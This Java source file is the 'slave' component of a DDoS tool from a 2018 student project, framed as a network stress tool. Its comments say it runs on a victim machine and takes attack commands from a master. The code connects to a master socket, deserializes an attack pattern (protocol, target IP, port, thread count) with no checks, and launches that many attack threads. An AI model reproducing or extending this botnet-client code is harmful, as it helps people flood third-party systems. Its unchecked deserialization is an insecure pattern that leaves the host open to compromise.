/**
 * FIRESEC TURBO FIRE
 * A stress network analysis tool.
 * ------------------------------------
 * Written by Lucas Fonseca dos Santos.
 * Copyleft 2018 - Rights not reserved.
 * ------------------------------------
 * 
 * Pratical project for discipline Distributed
 * Systems of Federal Univeristy of Lavras - MG,
 * Brazil.
 * 
 * CONTACT:
 * lucas@lcfcompany.com.br
 * github.com/LucasFonsecaDosSantos
 */
package app;

import view.GUI;
import utilies.AttackPattern;
import utilies.AttackFactory;
import protocols.interfaces.Protocol;
import java.io.PrintWriter;
import java.io.InputStreamReader;
import java.io.NotSerializableException;
import java.io.BufferedReader;
import java.io.ObjectInputStream;
import java.io.Serializable;
import java.net.Socket;

/**
 * @author Lucas Fonseca dos Santos
 * @author Otavio Andrade
 * @version 1.0
 * 
 * This class is the turbo fire slave executable version
 * of DDOS attack operation. It works into victim machine
 * executing a malicus command received by master turbo fire
 * executable version. The command receveid by this version
 * is a DDOS command with protocol, amount, force and target
 * system that will be attacked.
 */
public class TurboFireSlave implements Serializable {

    /**
     * The serial version of this object into JVM.
     */
    private static final long serialVersionUID = 1L;

    /**
     * A gui text interface.
     */
    private GUI gui;

    /**
     * Attack pattern mode with all DDOS settings.
     */
    private AttackPattern attackPattern;

    /**
     * The turbo fire slave version executable
     * constructor. It sets the gui instance and
     * start slave operation.
     */
    public TurboFireSlave() {
        this.gui = new GUI();
        startSlave();
    }

    /**
     * This method executs a slave turbo fire version and receives a malicius command
     * of master turbo fire version.
     */
    public void startSlave() {
        while(true) {
            try {
                System.out.println("I'M ONLINE");
                Socket socket = new Socket("127.0.0.1", 2525);
                ObjectInputStream ois = new ObjectInputStream(socket.getInputStream());
                this.attackPattern = (AttackPattern) ois.readObject();
                System.out.println(this.attackPattern.getProtocol() + " - " + this.attackPattern.getIP() + " - " + this.attackPattern.getPort() + " - " + this.attackPattern.getThreadAmount());
                ois.close();

                for(int i = 0 ; i < this.attackPattern.getThreadAmount() ; i++) {
                    Thread t = new Thread(AttackFactory.createAttack(this.attackPattern));
                    t.start();
                    System.out.println("ok");
                }
                break;
            }catch(NotSerializableException nse) {
                this.gui.showExceptionLog(nse.toString());
            }catch (Exception e) {
                this.gui.showExceptionLog(e.toString());
            }
        }

        for(int i = 0 ; i < this.attackPattern.getThreadAmount() ; i++) {

        }
    }
}